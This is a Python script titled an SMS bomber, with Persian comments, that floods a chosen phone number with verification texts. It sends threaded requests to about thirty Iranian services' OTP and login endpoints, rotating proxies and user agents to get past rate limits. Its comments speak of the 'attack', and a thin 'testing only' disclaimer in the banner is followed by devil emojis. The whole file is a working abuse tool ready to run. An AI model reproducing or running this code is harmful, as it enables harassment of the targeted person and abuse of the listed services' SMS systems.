#provider : Ehsan Yosefzadeh

# EEEEEEE   HH   HH   SSSSS    AAAA    NN   NN
# EE        HH   HH  SS       AA  AA   NNN  NN
# EEEEE     HHHHHHH   SSSSS   AAAAAA   NN N NN
# EE        HH   HH       SS  AA  AA   NN  NNN
# EEEEEEE   HH   HH  SSSSSS   AA  AA   NN   NN

import random
import threading
import time
import phonenumbers
import requests
from fake_useragent import UserAgent


class SMSBomber:
    def __init__(self, phone_number):
        self.phone_number = phone_number
        self.country_code = '+98'
        self.services = []
        self.load_services()
        self.session = requests.Session()
        self.ua = UserAgent()
        self.session.headers.update({
            'User-Agent': self.ua.random,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        })

        # لیست پروکسی‌ها برای دور زدن محدودیت IP
        self.proxies = self.load_proxies()
        self.proxy_index = 0
        self.threads = 5
        self.cycles = 1
        self.delay_between_cycles = 3

    def load_proxies(self):
        """بارگذاری لیست پروکسی‌ها از فایل یا لیست داخلی"""
        try:
            with open('proxies.txt', 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            # لیست پروکسی‌های عمومی (ممکن است کار نکنند)
            return [
               None
            ]

    def load_services(self):
        """بارگذاری لیست سرویس‌هایی که پیامک ارسال می‌کنند"""
        self.services = [
            {
                'name': 'Snapp V1',
                'url': 'https://api.snapp.ir/api/v1/sms/link',





                'method': 'POST',
                'data': lambda: {"phone": self.phone_number},
                'headers': {},
                'json': True,
            },
            {
                'name': 'Snapp V2',
                'url': f"https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone={self.phone_number}",
                'method': 'POST',
                'data': lambda: {"cellphone": self.phone_number},
                'headers': {},
                'json': True,
            },
            {
                'name': "DoctorNext",
                'url': "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token",
                'method': 'POST',
                'data': lambda: {"source": "besina", "mobile": self.phone_number,
                                 "key": "U2FsdGVkX197qqA2kXzD+GTu4qn/QCW1oYnbXhiK0qK1TRMg2YK09y1m/VBTqQ33QuYbBsUqHz3Q4BTANrnNgA=="},
                'headers': {},
                'json': True,
            },
            {
                'name': 'Tapsi',
                'url': 'https://api.tapsi.cab/api/v2.2/user',
                'method': 'POST',
                'data': lambda: {"credential": {"phoneNumber": self.phone_number, "role": "PASSENGER"},
                                 "otpOption": "SMS"},
                'headers': {},
                'json': True,
            },
            {
                'name': 'Snapp V3',
                'url': 'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass',
                'method': 'POST',
                'data': lambda: f'cellphone={self.phone_number}&platform=PWA',
                'headers': {},
                'json': False,
            },
            {
                'name': 'Behtarino',
                'url': 'https://bck.behtarino.com/api/v1/users/jwt_phone_verification/',
                'method': 'POST',
                'data': lambda: {"phone": self.phone_number},
                'headers': {},
                'json': True,
            },
            {
                'name': 'drdr',
                'url': 'https://drdr.ir/api/v3/auth/login/mobile/init',
                'method': 'POST',
                'data': lambda: {"mobile": self.phone_number},
                'headers': {},
                'json': True,
            },
            {
                'name': 'Okala',
                'url': 'https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister',
                'method': 'POST',
                'data': lambda: {"mobile": self.phone_number, "confirmTerms": 'true', "notRobot": 'false'},
                'headers': {},
                'json': True,
            },
            {
                'name': 'Mrbilit',
                'url': 'https://auth.mrbilit.ir/api/login/exists/v2',
                'method': 'POST',
                'data': lambda: f'mobileOrEmail={self.phone_number}&source=2&sendTokenIfNot=true',
                'headers': {},
                'json': False,
            },
            {
                'name': 'footbal360',
                'url': 'https://football360.ir/api/auth/v2/send_otp/',
                'method': 'POST',
                'data': lambda: {"phone_number": self.phone_number, "otp_token": "JZnul6S6Fl7bfFr6yFcziftf",
                                 "auto_read_platform": "ST"},
                'headers': {},
                'json': True,
            },
            {
                'name': 'Achareh',
                'url': 'https://api.achareh.co/v2/accounts/login/',
                'method': 'POST',
                'data': lambda: {"phone": f"98{self.phone_number[1:]}"},
                'headers': {},
                'json': True,
            },
            {
                'name': 'Zigap',
                'url': 'https://zigap.smilinno-dev.com/api/v1.6/authenticate/sendotp',
                'method': 'POST',
                'data': lambda: {"phoneNumber": f"+98{self.phone_number[1:]}"},
                'headers': {},
                'json': True,
            },
            {
                'name': 'Jabama',
                'url': 'https://gw.jabama.com/api/v4/account/send-code',
                'method': 'POST',
                'data': lambda: {"mobile": self.phone_number},
                'headers': {},
                'json': True,
            },
            {
                'name': 'Banimode',
                'url': 'https://mobapi.banimode.com/api/v2/auth/request',
                'method': 'POST',
                'data': lambda: {"phone": self.phone_number},
                'headers': {},
                'json': True,
            },
            {
                'name': 'Classino',
                'url': 'https://student.classino.com/otp/v1/api/login',
                'method': 'POST',
                'data': lambda: {"mobile": self.phone_number},
                'headers': {},
                'json': True,
            },
            {
                'name': 'Digikala V1',
                'url': 'https://api.digikala.com/v1/user/authenticate/',
                'method': 'POST',
                'data': lambda: {"username": self.phone_number, "otp_call": False},
                'headers': {},
                'json': True,
            },
            {
                'name': 'Digikala V2',
                'url': 'https://api.digikala.com/v1/user/forgot/check/',
                'method': 'POST',
                'data': lambda: {"username": self.phone_number},
                'headers': {},
                'json': True,
            },
            {
                'name': 'Sms.ir',
                'url': 'https://appapi.sms.ir/api/app/auth/sign-up/verification-code',
                'method': 'POST',
                'data': lambda: self.phone_number,
                'headers': {},
                'json': False,
            },
            {
                'name': 'Alibaba',
                'url': 'https://ws.alibaba.ir/api/v3/account/mobile/otp',
                'method': 'POST',
                'data': lambda: {"phoneNumber": self.phone_number[1:]},
                'headers': {},
                'json': True,
            },
            {
                'name': 'Divar',
                'url': 'https://api.divar.ir/v5/auth/authenticate',
                'method': 'POST',
                'data': lambda: {"phone": self.phone_number},
                'headers': {},
                'json': True,
            },
            {
                'name': 'Sheypoor',
                'url': 'https://www.sheypoor.com/api/v10.0.0/auth/send',
                'method': 'POST',
                'data': lambda: {"username": self.phone_number},
                'headers': {},
                'json': True,
            },
            {
                'name': 'Bikoplus',
                'url': 'https://bikoplus.com/account/check-phone-number',
                'method': 'POST',
                'data': lambda: {"phoneNumber": self.phone_number},
                'headers': {},
                'json': False,
            },
            {
                'name': 'Mootanroo',
                'url': 'https://api.mootanroo.com/api/v3/auth/send-otp',
                'method': 'POST',
                'data': lambda: {"PhoneNumber": self.phone_number},
                'headers': {},
                'json': True,
            },
            {
                'name': 'Tap33',
                'url': 'https://tap33.me/api/v2/user',
                'method': 'POST',
                'data': lambda: {"credential": {"phoneNumber": self.phone_number, "role": "BIKER"}},
                'headers': {},
                'json': True,
            },
            {
                'name': 'Tapsi Driver',
                'url': 'https://api.tapsi.ir/api/v2.2/user',
                'method': 'POST',
                'data': lambda: {
                    "credential": {"phoneNumber": self.phone_number, "role": "DRIVER"},
                    "otpOption": "SMS",
                },
                'headers': {},
                'json': True,
            },
            {
                'name': 'GapFilm',
                'url': 'https://core.gapfilm.ir/api/v3.1/Account/Login',
                'method': 'POST',
                'data': lambda: {"Type": "3", "Username": self.phone_number[1:]},
                'headers': {},
                'json': True,
            },
            {
                'name': 'IToll',
                'url': 'https://app.itoll.com/api/v1/auth/login',
                'method': 'POST',
                'data': lambda: {"mobile": self.phone_number},
                'headers': {},
                'json': True,
            },
            {
                'name': 'Anargift',
                'url': 'https://api.anargift.com/api/v1/auth/auth',
                'method': 'POST',
                'data': lambda: {"mobile_number": self.phone_number},
                'headers': {},
                'json': True,
            },
            {
                'name': 'Nobat',
                'url': 'https://nobat.ir/api/public/patient/login/phone',
                'method': 'POST',
                'data': lambda: {"mobile": self.phone_number[1:]},
                'headers': {},
                'json': True,
            },
        ]

    def validate_phone(self):
        """اعتبارسنجی شماره تلفن با فرمت بین‌المللی"""
        try:
            parsed = phonenumbers.parse(self.phone_number, None)
            if not phonenumbers.is_valid_number(parsed):
                return False
            # اطمینان از اینکه شماره ایران است (اختیاری)
            if phonenumbers.country_code_for_region('IR') != parsed.country_code:
                print("⚠️ شماره وارد شده مربوط به ایران نیست، اما همچنان تلاش می‌کنیم.")
            return True
        except:
            return False

    def get_proxy(self):
        """دریافت پروکسی بعدی از لیست"""
        proxy = self.proxies[self.proxy_index]
        self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
        return {'http': proxy, 'https': proxy}

    def send_request(self, service):
        """ارسال درخواست به یک سرویس مشخص"""
        try:
            # آماده‌سازی داده‌ها
            data = service['data']()
            headers = service.get('headers', {}).copy()
            # ترکیب هدرهای پیش‌فرض با هدرهای اختصاصی سرویس
            headers.update({'User-Agent': self.ua.random})
            url = service['url']
            method = service['method'].upper()
            use_json = service.get('json', False)

            # ارسال درخواست
            if method == 'POST':
                if use_json:
                    resp = self.session.post(url, json=data, headers=headers, timeout=10, proxies=self.get_proxy())
                else:
                    resp = self.session.post(url, data=data, headers=headers, timeout=10, proxies=self.get_proxy())
            else:  # GET (کمتر پیش می‌آید)
                resp = self.session.get(url, params=data, headers=headers, timeout=10, proxies=self.get_proxy())

            # بررسی نتیجه (در صورت موفقیت، احتمالاً کد 200 یا 4xx برگردانده می‌شود)
            if resp.status_code in [200, 201, 202, 204]:
                print(f"[✓] {service['name']}: درخواست با موفقیت ارسال شد")
            elif resp.status_code in [400, 401, 403, 429]:
                print(f"[!] {service['name']}: محدودیت یا خطا (کد {resp.status_code})")
            else:
                print(f"[?] {service['name']}: پاسخ غیرمنتظره (کد {resp.status_code})")
        except requests.exceptions.Timeout:
            print(f"[-] {service['name']}: تایم‌اوت")
        except requests.exceptions.ConnectionError:
            print(f"[-] {service['name']}: خطای اتصال")
        except Exception as e:
            print(f"[-] {service['name']}: خطای ناشناخته - {str(e)}")

    def worker(self, services_subset, cycle_num):
        """کارگر هر ترد: ارسال درخواست‌ها برای یک زیرمجموعه از سرویس‌ها"""
        for service in services_subset:
            print(f"[*] چرخه {cycle_num}: ارسال به {service['name']}...")
            self.send_request(service)
            time.sleep(random.uniform(0.5, 2))  # تأخیر کوتاه‌تر برای حمله سریع‌تر

    def start(self, threads=5, cycles=1, delay_between_cycles=3):
        """شروع بمباران با تعداد ترد و چرخه مشخص"""
        if not self.validate_phone():
            print("❌ شماره تلفن نامعتبر است.")
            return

        print(f"\n🚀 شروع بمباران شماره {self.phone_number}")
        print(f"⚙️  تعداد تردها: {threads}, تعداد چرخه: {cycles}\n")

        # تقسیم سرویس‌ها بین تردها
        service_count = len(self.services)
        chunk_size = max(1, service_count // threads)
        service_chunks = [self.services[i:i + chunk_size] for i in range(0, service_count, chunk_size)]

        for cycle in range(1, cycles + 1):
            print(f"\n{'=' * 50}\nچرخه {cycle} از {cycles}\n{'=' * 50}")
            thread_list = []
            for chunk in service_chunks:
                t = threading.Thread(target=self.worker, args=(chunk, cycle))
                t.start()
                thread_list.append(t)

            for t in thread_list:
                t.join()

            if cycle < cycles:
                print(f"\n⏳ استراحت {delay_between_cycles} ثانیه تا چرخه بعدی...\n")
                time.sleep(delay_between_cycles)

        print("\n✅ بمباران به پایان رسید.")


def banner():
    print(r"""
    ███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
    ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
    ███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
    ╚════██║██║╚██╔╝█ █║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
    ███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║ 
    ╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
    """)
    print("                        ابزار تست ارسال انبوه پیامک (فقط برای آزمایش)")
    print("                      استفاده غیرقانونی از این ابزار ممنوع است!")
    print('                       حواستون به نحوه استفاده تون باشه😈😈+')

def main():
    banner()
    phone = input("📱 شماره تلفن مقصد (با کد کشور، مانند +98912xxxxxxx): ").strip()
    if not phone.startswith('+'):
        phone = '+98' + phone.lstrip('0')  # تبدیل خودکار برای ایران
    try:
        threads = int(input("🧵 تعداد تردهای هم‌زمان (پیش‌فرض 5): ") or 5)
        cycles = int(input("🔄 تعداد چرخه (پیش‌فرض 1): ") or 1)
        delay = int(input("⏱️  تأخیر بین چرخه‌ها به ثانیه (پیش‌فرض 3): ") or 3)
    except ValueError:
        print("❌ ورودی نامعتبر، استفاده از مقادیر پیش‌فرض.")
        threads, cycles, delay = 5, 1, 3

    bomber = SMSBomber(phone)
    bomber.start(threads=threads, cycles=cycles, delay_between_cycles=delay)


if __name__ == "__main__":
    main()